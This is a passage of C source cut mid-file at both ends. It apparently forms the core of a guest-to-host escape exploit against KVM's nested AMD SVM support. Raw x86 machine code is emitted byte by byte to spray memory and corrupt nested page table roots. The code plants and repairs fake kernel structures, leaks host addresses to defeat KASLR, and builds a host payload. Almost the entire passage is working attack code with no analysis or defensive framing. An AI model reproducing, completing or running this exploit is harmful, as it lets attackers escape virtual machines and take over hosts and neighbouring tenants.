	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x0d);
	e32(&p, TARGET_C_BASE + 80u);
	uint8_t *unlock_bad = emit_rel32_jcc(&p, 0x85);
	uint8_t *unlock_skip = emit_rel32_jmp(&p);
	uint8_t *unlock_fail = p;

	emit32_fail_block(&p, 'U');
	patch_rel32(unlock_bad, unlock_fail);
	patch_rel32(unlock_skip, p);
	emit32_wait_byte(&p, SPRAY_ARM + 18u, 'L');
	emit32_require_c_self(&p, '1');
	emit32_load_eax(&p, G1_MARKER + 64u);
	e8(&p, 0x25);
	e32(&p, 0xfffff000u);
	emit32_store_eax(&p, HOST_HVA_LO);
	emit32_load_eax(&p, G1_MARKER + 68u);
	emit32_store_eax(&p, HOST_HVA_HI);
	emit32_require_distinct_pages(&p, 'D');
	emit32_repair_fake_c(&p, 1);
	emit32_store8_imm(&p, SPRAY_ARM + 19u, 'R');
	emit32_require_stage2_zero(&p, 'z');
	emit32_arm_fake_c(&p, SAFE_SPT_HVA_LO, SAFE_SPT_HVA_HI, 0, KS_F_LO,
			  KS_F_HI, 0x30, 2);
	emit32_store8_imm(&p, SPRAY_ARM + 21u, '2');
	emit32_wait_byte(&p, KS_PASS_EXIT, 2);
	emit32_repair_fake_c(&p, 2);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_F_LO, KS_F_HI, 0x30);
	emit32_oracle_marker(&p, 0x8u, true, '2');
	emit32_require_c_self(&p, '2');
	emit32_store8_imm(&p, SPRAY_ARM + 23u, 'r');
	emit32_wait_byte(&p, KS_PASS_FREE, 2);
	emit32_arm_fake_c(&p, SAFE_SPT_HVA_LO, SAFE_SPT_HVA_HI, 0x100, KS_F_LO,
			  KS_F_HI, 0x40, 3);
	emit32_wait_byte(&p, KS_PASS_EXIT, 3);
	emit32_repair_fake_c(&p, 3);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_F_LO, KS_F_HI, 0x40);
	emit32_oracle_marker(&p, 0x108u, false, '3');
	emit32_require_c_self(&p, '3');
	emit32_wait_byte(&p, KS_PASS_FREE, 3);
	emit32_arm_fake_c(&p, SAFE_SPT_HVA_LO, SAFE_SPT_HVA_HI, 0x200, KS_F_LO,
			  KS_F_HI, 0, 4);
	emit32_wait_byte(&p, KS_PASS_EXIT, 4);
	emit32_repair_fake_c(&p, 4);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_F_LO, KS_F_HI, 0);
	emit32_oracle_marker(&p, 0x208u, false, '4');
	emit32_require_c_self(&p, '4');
	emit32_wait_byte(&p, KS_PASS_FREE, 4);
	emit32_require_stage2_zero(&p, '5');
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 16u, G1_MARKER + 40u,
			       G1_MARKER + 44u, KVM_PSEUDO_FROM_H);
	emit32_arm_fake_c(&p, G1_MARKER + 64u, G1_MARKER + 68u, -136,
			  G1_MARKER + 56u, G1_MARKER + 60u, 0x10, 5);
	emit32_wait_byte(&p, KS_PASS_EXIT, 5);
	emit32_repair_fake_c(&p, 5);
	emit32_require_c_self(&p, '5');
	emit32_require_stage2_zero(&p, 'h');
	emit32_wait_byte(&p, KS_PASS_FREE, 5);
	emit32_arm_fake_c(&p, KS_F_LO, KS_F_HI, 0x10, G1_MARKER + 64u,
			  G1_MARKER + 68u, -136, 6);
	emit32_wait_byte(&p, KS_PASS_EXIT, 6);
	emit32_repair_fake_c(&p, 6);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_F_LO, KS_F_HI, 0x10);
	uint8_t *c_hash_bad[4];

	emit32_load_eax(&p, TARGET_C_BASE + 16u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	c_hash_bad[0] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 20u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	c_hash_bad[1] = emit_rel32_jcc(&p, 0x85);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, G1_MARKER + 56u,
			       G1_MARKER + 60u, 0x10);
	emit32_load_eax(&p, TARGET_C_BASE + 24u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	c_hash_bad[2] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 28u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	c_hash_bad[3] = emit_rel32_jcc(&p, 0x85);
	uint8_t *c_hash_ok = emit_rel32_jmp(&p);
	uint8_t *c_hash_fail = p;

	emit32_fail_block(&p, 'j');
	for (unsigned int i = 0; i < 4; i++)
		patch_rel32(c_hash_bad[i], c_hash_fail);
	patch_rel32(c_hash_ok, p);
	emit32_store8_imm(&p, KS_C_HASH_LINKED, 'J');
	emit32_wait_byte(&p, KS_PASS_FREE, 6);
	emit32_store_imm(&p, TARGET_C_BASE + 128u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 132u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 136u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 140u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 144u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 148u, TARGET_ROLE_INVALID);
	emit32_arm_fake_c(&p, G1_MARKER + 64u, G1_MARKER + 68u, -24, KS_F_LO,
			  KS_F_HI, 0x10, 7);
	emit32_wait_byte(&p, KS_PASS_EXIT, 7);
	emit32_repair_fake_c(&p, 7);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_F_LO, KS_F_HI, 0x10);
	emit32_load_eax(&p, TARGET_C_BASE + 136u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	uint8_t *q7_bad_lo = emit_rel32_jcc(&p, 0x85);

	emit32_load_eax(&p, TARGET_C_BASE + 140u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	uint8_t *q7_bad_hi = emit_rel32_jcc(&p, 0x85);
	uint8_t *q7_ok = emit_rel32_jmp(&p);
	uint8_t *q7_fail = p;

	emit32_fail_block(&p, 't');
	patch_rel32(q7_bad_lo, q7_fail);
	patch_rel32(q7_bad_hi, q7_fail);
	patch_rel32(q7_ok, p);
	emit32_wait_byte(&p, KS_PASS_FREE, 7);
	emit32_arm_fake_c(&p, KS_K_LO, KS_K_HI, KVM_NMAX_PREV_OFF,
			  SAFE_SPT_HVA_LO, SAFE_SPT_HVA_HI, 0x300, 8);
	emit32_wait_byte(&p, KS_PASS_EXIT, 8);
	emit32_repair_fake_c(&p, 8);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, KS_K_LO, KS_K_HI,
			       KVM_NMAX_PREV_OFF);
	emit32_oracle_marker(&p, 0x300u, false, '8');
	emit32_store8_imm(&p, KS_QMAX_ORACLE, 'O');
	emit32_require_c_self(&p, 'q');
	emit32_store8_imm(&p, KS_QMAX_C_REPAIRED, 'C');
	emit32_wait_byte(&p, KS_PASS_FREE, 8);
	e8(&p, 0x0f);
	e8(&p, 0x20);
	e8(&p, 0xc0);
	e8(&p, 0x25);
	e32(&p, 0x7fffffffu);
	e8(&p, 0x0f);
	e8(&p, 0x22);
	e8(&p, 0xc0);
	emit32_store8_imm(&p, KS_PAGING_OFF, 'U');
	emit32_require_stage2_zero(&p, '8');
	emit32_arm_pre_e_c(&p);
	emit32_wait_byte(&p, KS_E_READY, 'E');
	emit32_require_n_qword_zero(&p, 'e');
	emit32_finish_pre_e_c(&p);
	emit32_store_imm(&p, 0x28u, 0xa7u);
	emit32_require_n_qword_zero(&p, 'a');
	emit32_store8_imm(&p, KS_TRACK_REQ, 1);
	emit32_wait_byte(&p, KS_TRACK_ACK, 1);
	emit32_store_imm(&p, 0x28u, 0xa7u);
	emit32_require_n_qword_zero(&p, 'b');
	emit32_store8_imm(&p, KS_TRACK_REQ, 2);
	emit32_wait_byte(&p, KS_TRACK_ACK, 2);
	emit32_store_imm(&p, 0x28u, 0xa7u);
	emit32_finish_p_leak(&p);
	emit32_require_stage2_zero(&p, 'p');
	emit32_build_kaslr_host_payload(&p);
	emit32_arm_hash_c_host_effect(&p);
	emit32_store_imm(&p, 0x28u, 0xa7u);
	emit32_store8_imm(&p, KS_TRACK_REQ, 3);
	emit32_wait_byte(&p, KS_TRACK_ACK, 3);
	emit32_store_imm(&p, 0x28u, 0xa7u);
	emit32_store8_imm(&p, KS_TRACK_REQ, 4);
	emit32_wait_byte(&p, KS_TRACK_ACK, 4);
	emit32_store_imm(&p, 0x28u, 0xa7u);
	emit32_finish_c_splice(&p);
	*pp = p;
}

static void build(void)
{
	w64(G1_PML4, G1_PDPT | 0x7);
	w64(G1_PDPT, G1_PD | 0x7);
	for (int i = 0; i < 512; i++)
		w64(G1_PD + i * 8, ((uint64_t)i << 21) | 0x83);
	w64(G1_PAE_PDPT + 0, G1_PAE_PD | 0x1);
	for (int i = 1; i < 4; i++)
		w64(G1_PAE_PDPT + i * 8, 0);
	for (int i = 0; i < 512; i++)
		w64(G1_PAE_PD + i * 8, ((uint64_t)i << 21) | 0x83);
	w64(G1_GDT + 0x00, 0);
	w64(G1_GDT + 0x08, 0x00af9b000000ffffull);
	w64(G1_GDT + 0x10, 0x00cf9b000000ffffull);
	w64(G1_GDT + 0x18, 0x00cf93000000ffffull);
	*(uint16_t *)(M + G1_GDTR) = 0x1f;
	w64(G1_GDTR + 2, G1_GDT);
	uint8_t *p = M + G1_CODE_A;

	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, G1_VMCB);
	e8(&p, 0x0f);
	e8(&p, 0x01);
	e8(&p, 0xd8);
	for (int i = 1; i < S_COUNT; i++)
		emit_vmrun_root(&p, S_NPT_PML4(i));
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, G1_MARKER + 7);
	e8(&p, 'S');
	emit_vmrun_root(&p, NPT_PML4);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, G1_MARKER);
	e8(&p, 'A');
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, H_NPT_PML4);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, nested_cr3));
	e8(&p, 0x48);
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb, save) +
			offsetof(struct vmcb_save_area, rip));
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, clean));
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, G1_VMCB);
	e8(&p, 0x0f);
	e8(&p, 0x01);
	e8(&p, 0xd8);
	e8(&p, 0xa1);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, exit_code));
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 8);
	e8(&p, 0x48);
	e8(&p, 0xa1);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, exit_info_1));
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 16);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, G1_MARKER + 4);
	e8(&p, 'B');
	for (int i = 0; i < SHIFT_LEAVES; i++)
		emit_vmrun_root_at(&p, S_NPT_PML4(i), 0x40000000u);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, G1_MARKER + 28);
	e8(&p, 'E');
	for (int i = 0; i < SHIFT_LEAVES; i++) {
		e8(&p, 0xc7);
		e8(&p, 0x04);
		e8(&p, 0x25);
		e32(&p, S_NPT_PDPT(i) + 8);
		e32(&p, 0);
		emit64_misaligned_child_zap(&p, SHIFT_PD_BASE +
							(uint32_t)i * 0x1000u);
	}
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, G1_MARKER + 31);
	e8(&p, 'F');
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, G1_MARKER + 30);
	e8(&p, 'W');
	emit_vmrun_root_at(&p, H_NPT_PML4, 0x400);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, G1_MARKER + 29);
	e8(&p, 'b');
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, G_NPT_PML4);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, nested_cr3));
	e8(&p, 0x48);
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb, save) +
			offsetof(struct vmcb_save_area, rip));
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, clean));
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, G1_VMCB);
	e8(&p, 0x0f);
	e8(&p, 0x01);
	e8(&p, 0xd8);
	e8(&p, 0xa1);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, exit_code));
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 24);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, G1_MARKER + 6);
	e8(&p, 'G');
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, NPT_PAE);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, nested_cr3));
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, 0x400);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb, save) +
			offsetof(struct vmcb_save_area, rip));
	e8(&p, 0x48);
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, clean));
	e8(&p, 0x0f);
	e8(&p, 0x01);
	e8(&p, 0x14);
	e8(&p, 0x25);
	e32(&p, G1_GDTR);
	e8(&p, 0x6a);
	e8(&p, 0x10);
	e8(&p, 0xb8);
	e32(&p, G1_CODE_B);
	e8(&p, 0x50);
	e8(&p, 0x48);
	e8(&p, 0xcb);
	e8(&p, 0xf4);
	uint8_t *t = M + G1_SPRAY_CODE;

	e8(&t, 0xb8);
	e32(&t, SPRAY_START);
	uint8_t *prefault_loop = t;

	e8(&t, 0x48);
	e8(&t, 0xc7);
	e8(&t, 0x00);
	e32(&t, 0);
	e8(&t, 0x48);
	e8(&t, 0x05);
	e32(&t, 0x200000);
	e8(&t, 0x48);
	e8(&t, 0x3d);
	e32(&t, SPARSE_PREFAULT_END);
	e8(&t, 0x72);
	e8(&t, (uint8_t)(prefault_loop - (t + 1)));
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 4);
	e8(&t, 'Y');
	uint8_t *wait_a = t;

	e8(&t, 0x80);
	e8(&t, 0x3c);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 3);
	e8(&t, 'A');
	e8(&t, 0x74);
	e8(&t, 0x04);
	e8(&t, 0xf3);
	e8(&t, 0x90);
	e8(&t, 0xeb);
	e8(&t, (uint8_t)(wait_a - (t + 1)));
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 2);
	e8(&t, 'R');
	uint8_t *wait_p = t;

	e8(&t, 0x80);
	e8(&t, 0x3c);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM);
	e8(&t, 'C');
	e8(&t, 0x74);
	e8(&t, 0x04);
	e8(&t, 0xf3);
	e8(&t, 0x90);
	e8(&t, 0xeb);
	e8(&t, (uint8_t)(wait_p - (t + 1)));
	e8(&t, 0x48);
	e8(&t, 0xb8);
	e64(&t, G1_PAE_PDPT);
	e8(&t, 0x48);
	e8(&t, 0xba);
	e64(&t, (uint64_t)G1_PAE_PD | 0x1);
	e8(&t, 0x48);
	e8(&t, 0x89);
	e8(&t, 0x10);
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 1);
	e8(&t, 'D');
	emit64_wait_byte(&t, SPRAY_ARM + 51u, 'E');
	emit64_wait_byte(&t, SPRAY_ARM + 5u, 'F');
	emit_vmrun_h_root_at(&t, G_NPT_PML4, G_P1_NESTED_RIP);
	emit64_require_h_vmmcall(&t, 'N');
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 7);
	e8(&t, 'X');
	uint8_t *wait_p1_ack = t;

	e8(&t, 0x80);
	e8(&t, 0x3c);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 8);
	e8(&t, 'Y');
	e8(&t, 0x74);
	e8(&t, 0x04);
	e8(&t, 0xf3);
	e8(&t, 0x90);
	e8(&t, 0xeb);
	e8(&t, (uint8_t)(wait_p1_ack - (t + 1)));
	e8(&t, 0x48);
	e8(&t, 0xb8);
	e64(&t, G_NPT_PDPT + 8);
	e8(&t, 0x48);
	e8(&t, 0xc7);
	e8(&t, 0x00);
	e32(&t, 0);
	emit64_misaligned_child_zap(&t, G_NPT_PT1);
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 6);
	e8(&t, '1');
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 9);
	e8(&t, 'L');
	uint8_t *wait_fake_armed = t;

	e8(&t, 0x80);
	e8(&t, 0x3c);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 10);
	e8(&t, 'R');
	e8(&t, 0x74);
	e8(&t, 0x04);
	e8(&t, 0xf3);
	e8(&t, 0x90);
	e8(&t, 0xeb);
	e8(&t, (uint8_t)(wait_fake_armed - (t + 1)));
	e8(&t, 0xb9);
	e32(&t, DRAIN_LEAVES);
	e8(&t, 0x48);
	e8(&t, 0xba);
	e64(&t, 0x400000ull);
	e8(&t, 0x48);
	e8(&t, 0xbb);
	e64(&t, H_G1_VMCB);
	uint8_t *drain_loop = t;

	e8(&t, 0x48);
	e8(&t, 0x89);
	e8(&t, 0x14);
	e8(&t, 0x25);
	e32(&t, H_G1_VMCB + offsetof(struct vmcb, save) +
			offsetof(struct vmcb_save_area, rip));
	e8(&t, 0x48);
	e8(&t, 0x31);
	e8(&t, 0xc0);
	e8(&t, 0x48);
	e8(&t, 0xa3);
	e64(&t, H_G1_VMCB + offsetof(struct vmcb_control_area, clean));
	e8(&t, 0x48);
	e8(&t, 0x89);
	e8(&t, 0xd8);
	e8(&t, 0x0f);
	e8(&t, 0x01);
	e8(&t, 0xd8);
	e8(&t, 0x48);
	e8(&t, 0x81);
	e8(&t, 0xc2);
	e32(&t, 0x200000u);
	e8(&t, 0xff);
	e8(&t, 0xc9);
	e8(&t, 0x75);
	e8(&t, (uint8_t)(drain_loop - (t + 1)));
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 11);
	e8(&t, 'V');
	for (int i = 0; i < 3; i++) {
		e8(&t, 0x48);
		e8(&t, 0xb8);
		e64(&t, G_NPT_PML4 + (uint32_t)i * 8u);
		e8(&t, 0x48);
		e8(&t, 0xc7);
		e8(&t, 0x00);
		e32(&t, 0);
		if (!i)
			emit64_misaligned_child_zap(&t, G_NPT_PDPT);
	}
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 12);
	e8(&t, 'Z');
	uint8_t *wait_conveyor_p = t;

	e8(&t, 0x80);
	e8(&t, 0x3c);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 35);
	e8(&t, 'P');
	e8(&t, 0x74);
	e8(&t, 0x04);
	e8(&t, 0xf3);
	e8(&t, 0x90);
	e8(&t, 0xeb);
	e8(&t, (uint8_t)(wait_conveyor_p - (t + 1)));
	emit64_flood_prepare_page(&t, NPT_PD);
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 36);
	e8(&t, 'p');
	uint8_t *wait_conveyor_bc = t;

	e8(&t, 0x80);
	e8(&t, 0x3c);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 38);
	e8(&t, 'B');
	e8(&t, 0x74);
	e8(&t, 0x04);
	e8(&t, 0xf3);
	e8(&t, 0x90);
	e8(&t, 0xeb);
	e8(&t, (uint8_t)(wait_conveyor_bc - (t + 1)));
	emit64_flood_prepare_page(&t, NPT_PD);
	emit64_flood_prepare_page(&t, npt_pd_addr(1));
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 39);
	e8(&t, 'b');
	emit64_flood_prepare_page(&t, H_NPT_PD0);
	emit64_flood_prepare_page(&t, H_NPT_PD1);
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 40);
	e8(&t, 'a');
	emit64_flood_prepare_page(&t, npt_pd_addr(2));
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 41);
	e8(&t, 'c');
	e8(&t, 0xb8);
	e32(&t, SPRAY2_START);
	uint8_t *stage2_loop = t;

	e8(&t, 0x48);
	e8(&t, 0xc7);
	e8(&t, 0x00);
	e32(&t, 0);
	e8(&t, 0x48);
	e8(&t, 0x05);
	e32(&t, 0x1000);
	e8(&t, 0x48);
	e8(&t, 0x3d);
	e32(&t, SPRAY2_END);
	e8(&t, 0x72);
	e8(&t, (uint8_t)(stage2_loop - (t + 1)));
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, SPRAY_ARM + 13);
	e8(&t, 'F');
	e8(&t, 0xc6);
	e8(&t, 0x04);
	e8(&t, 0x25);
	e32(&t, G1_MARKER + 3);
	e8(&t, 'H');
	e8(&t, 0x48);
	e8(&t, 0xb8);
	e64(&t, G1_POST_CODE);
	e8(&t, 0xff);
	e8(&t, 0xe0);
	if (t > M + G1_SPRAY_CODE + 0x1000u) {
		errno = EOVERFLOW;
		die("sprayer code overflow");
	}
	uint8_t *q = M + G1_CODE_B;

	e8(&q, 0xfa);
	e8(&q, 0x66);
	e8(&q, 0xb8);
	e8(&q, 0x18);
	e8(&q, 0x00);
	e8(&q, 0x8e);
	e8(&q, 0xd8);
	e8(&q, 0x8e);
	e8(&q, 0xc0);
	e8(&q, 0x8e);
	e8(&q, 0xd0);
	e8(&q, 0xb8);
	e32(&q, 0x00000011u);
	e8(&q, 0x0f);
	e8(&q, 0x22);
	e8(&q, 0xc0);
	e8(&q, 0xb9);
	e32(&q, 0xc0000080u);
	e8(&q, 0x0f);
	e8(&q, 0x32);
	e8(&q, 0x25);
	e32(&q, ~EFER_LME);
	e8(&q, 0x0f);
	e8(&q, 0x30);
	e8(&q, 0xb8);
	e32(&q, 0x20);
	e8(&q, 0x0f);
	e8(&q, 0x22);
	e8(&q, 0xe0);
	e8(&q, 0x31);
	e8(&q, 0xc0);
	e8(&q, 0x0f);
	e8(&q, 0x22);
	e8(&q, 0xd8);
	e8(&q, 0xb8);
	e32(&q, 0x80000011u);
	e8(&q, 0x0f);
	e8(&q, 0x22);
	e8(&q, 0xc0);
	*q++ = 0xc6;
	*q++ = 0x05;
	*(uint32_t *)q = G1_MARKER + 1;
	q += 4;
	*q++ = 'P';
	*q++ = 0xa1;
	*(uint32_t *)q = H_NPT_PML4;
	q += 4;
	*q++ = 0xb8;
	*(uint32_t *)q = G1_VMCB;
	q += 4;
	*q++ = 0x0f;
	*q++ = 0x01;
	*q++ = 0xd8;
	*q++ = 0xc6;
	*q++ = 0x05;
	*(uint32_t *)q = G1_MARKER + 2;
	q += 4;
	*q++ = 'Q';
	*q++ = 0xa1;
	*(uint32_t *)q = H_NPT_PDPT;
	q += 4;
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = H_NPT_PML4;
	q += 4;
	*(uint32_t *)q = 0;
	q += 4;
	emit32_misaligned_child_zap(&q, H_NPT_PDPT);
	*q++ = 0xc6;
	*q++ = 0x05;
	*(uint32_t *)q = G1_MARKER + 5;
	q += 4;
	*q++ = 'Z';
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = G1_PAE_PDPT;
	q += 4;
	*(uint32_t *)q = G1_PAE_PD | 0x1;
	q += 4;
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = G1_PAE_PDPT + 4;
	q += 4;
	*(uint32_t *)q = 0;
	q += 4;
	*q++ = 0xb8;
	*(uint32_t *)q = 0x80050011u;
	q += 4;
	*q++ = 0x0f;
	*q++ = 0x22;
	*q++ = 0xc0;
	uint8_t *same_cpu_root_flood = q;

	for (unsigned int pd = 0; pd < PHASE_B_PAE_ROOTS; pd++)
		for (unsigned int write = 0; write < 3u; write++)
			emit32_store8_imm(&q, npt_pd_addr(pd) + 0xff8u, 0);
	if ((size_t)(q - same_cpu_root_flood) != PHASE_B_PAE_ROOTS * 3u * 7u) {
		errno = EINVAL;
		die("phase-B same-vCPU root-flood encoding");
	}
	emit32_store8_imm(&q, SPRAY_ARM + 51u, 'E');
	*q++ = 0xb8;
	*(uint32_t *)q = SPRAY_START;
	q += 4;
	uint8_t *dense_loop = q;
	*q++ = 0xc7;
	*q++ = 0x00;
	*(uint32_t *)q = 0;
	q += 4;
	*q++ = 0x05;
	*(uint32_t *)q = 0x1000;
	q += 4;
	*q++ = 0x3d;
	*(uint32_t *)q = SPRAY1_END;
	q += 4;
	int8_t dense_back = (int8_t)(dense_loop - (q + 2));
	*q++ = 0x72;
	*q++ = (uint8_t)dense_back;
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = G1_PAE_PDPT;
	q += 4;
	*(uint32_t *)q = G1_PAE_PD | 0x1;
	q += 4;
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = G1_PAE_PDPT + 4;
	q += 4;
	*(uint32_t *)q = 0;
	q += 4;
	*q++ = 0xb8;
	*(uint32_t *)q = 0x80000011u;
	q += 4;
	*q++ = 0x0f;
	*q++ = 0x22;
	*q++ = 0xc0;
	*q++ = 0xc6;
	*q++ = 0x05;
	*(uint32_t *)q = SPRAY_ARM + 5;
	q += 4;
	*q++ = 'F';
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = G1_PAE_PDPT;
	q += 4;
	*(uint32_t *)q = G1_PAE_PD | 0x1;
	q += 4;
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = G1_PAE_PDPT + 4;
	q += 4;
	*(uint32_t *)q = 0;
	q += 4;
	uint8_t *wait_p1_x = q;
	*q++ = 0x80;
	*q++ = 0x3d;
	*(uint32_t *)q = SPRAY_ARM + 7;
	q += 4;
	*q++ = 'X';
	*q++ = 0x74;
	*q++ = 0x04;
	*q++ = 0xf3;
	*q++ = 0x90;
	int8_t wait_p1_x_back = (int8_t)(wait_p1_x - (q + 2));
	*q++ = 0xeb;
	*q++ = (uint8_t)wait_p1_x_back;
	*q++ = 0xa1;
	*(uint32_t *)q = TARGET_P1_PTR;
	q += 4;
	*q++ = 0xa3;
	*(uint32_t *)q = G1_MARKER + 32;
	q += 4;
	*q++ = 0xa1;
	*(uint32_t *)q = TARGET_P1_PTR + 4;
	q += 4;
	*q++ = 0xa3;
	*(uint32_t *)q = G1_MARKER + 36;
	q += 4;
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = TARGET_C_BASE + 64;
	q += 4;
	*(uint32_t *)q = 1;
	q += 4;
	*q++ = 0xc7;
	*q++ = 0x05;
	*(uint32_t *)q = TARGET_C_BASE + 36;
	q += 4;
	*(uint32_t *)q = TARGET_ROLE_INVALID;
	q += 4;
	*q++ = 0xc6;
	*q++ = 0x05;
	*(uint32_t *)q = SPRAY_ARM + 8;
	q += 4;
	*q++ = 'Y';
	uint8_t *wait_p1_exit = q;
	*q++ = 0x80;
	*q++ = 0x3d;
	*(uint32_t *)q = SPRAY_ARM + 6;
	q += 4;
	*q++ = '1';
	*q++ = 0x74;
	*q++ = 0x04;
	*q++ = 0xf3;
	*q++ = 0x90;
	int8_t wait_p1_exit_back = (int8_t)(wait_p1_exit - (q + 2));
	*q++ = 0xeb;
	*q++ = (uint8_t)wait_p1_exit_back;
	uint8_t *wait_head_leak = q;
	*q++ = 0x80;
	*q++ = 0x3d;
	*(uint32_t *)q = SPRAY_ARM + 9;
	q += 4;
	*q++ = 'L';
	*q++ = 0x74;
	*q++ = 0x04;
	*q++ = 0xf3;
	*q++ = 0x90;
	int8_t wait_head_leak_back = (int8_t)(wait_head_leak - (q + 2));
	*q++ = 0xeb;
	*q++ = (uint8_t)wait_head_leak_back;
	*q++ = 0xa1;
	*(uint32_t *)q = TARGET_P1_PTR;
	q += 4;
	*q++ = 0xa3;
	*(uint32_t *)q = G1_MARKER + 40;
	q += 4;
	*q++ = 0xa1;
	*(uint32_t *)q = TARGET_P1_PTR + 4;
	q += 4;
	*q++ = 0xa3;
	*(uint32_t *)q = G1_MARKER + 44;
	q += 4;
	*q++ = 0xa1;
	*(uint32_t *)q = TARGET_C_BASE;
	q += 4;
